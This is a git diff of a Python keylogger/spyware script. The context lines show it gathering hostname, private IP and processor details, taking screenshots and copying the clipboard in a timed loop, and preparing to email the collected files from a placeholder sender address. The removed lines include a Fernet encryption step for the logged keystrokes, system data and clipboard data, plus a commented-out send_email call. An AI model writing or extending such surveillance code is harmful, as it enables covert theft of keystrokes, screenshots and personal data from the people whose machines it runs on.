@@ -24,8 +24,6 @@ system_information_e = "system_information_e"
 key_log_e = "key_log_e"
 clipboard_information_e = "clipboard_information_e"
 
-key = "" # encryption key
-
 file_path = "C:\\" # actual_path_to_folder_containing_all_these_files
 extend = "\\"
 file_merge = file_path + extend
@@ -44,14 +42,6 @@ def computer_information():
 
         f.write("Processor: " + (platform.processor()) + "\n")
         f.write("System: " + platform.platform() + " " + "\n")
-        # f.write("System: " + platform.system() + " " + platform.platform() + "\n")
-        # info = subprocess.check_output(powershell,
-        #                                stdin=subprocess.DEVNULL,
-        #                                stderr=subprocess.DEVNULL,
-        #                                text=True,
-        #                                shell=True)
-        # if (int(info.strip(".")[2]) == 22000):
-        #     return "Windows [Version 11.0.22000.194]"
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + ipaddress + "\n")
@@ -128,7 +118,6 @@ while number_of_iterations < number_of_iterations_end:
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
             screenshot()
-            # send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
 
             copy_clipboard()
 
@@ -136,24 +125,6 @@ while number_of_iterations < number_of_iterations_end:
 
             currentTime = time.time()
             stoppingTime = time.time() + time_iteration
-
-normal_files = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information]
-encrypted_files = [file_merge + keys_information_e, file_merge + system_information_e, file_merge + clipboard_information_e]
-
-# encrypting_files
-count = 0
-for encrypting_files in normal_files:
-    with open(normal_files[count], 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-
-    with open(encrypted_files[count], 'wb') as f:
-        f.write(encrypted)
-
-    count += 1
-time.sleep(120)
 
 # sending email
 fromaddr = "sender's email"
